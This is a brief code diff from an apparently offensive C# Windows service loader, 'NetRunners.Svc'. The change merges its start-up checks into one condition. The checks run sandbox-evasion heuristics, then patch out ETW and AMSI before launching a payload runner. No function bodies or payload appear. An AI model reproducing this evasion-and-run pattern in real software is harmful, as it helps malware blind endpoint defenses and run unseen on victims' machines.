@@ -20,15 +20,9 @@ namespace NetRunners.Svc
         protected override void OnStart(string[] args)
         {
             // call heuristic functions
-            if ((!Sleep()) || (!NonEmulated()))
-            {
-                return;
-            }
-            // call patchers
-            if ((!PatchEtw()) || (!PatchAmsi()))
+            if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
                 return;
 
-            // Uncomment your choice
             Runners.EpsRunner.Run();
             //Runners.PiRunner.Run();
             //Runners.Runner.Run();
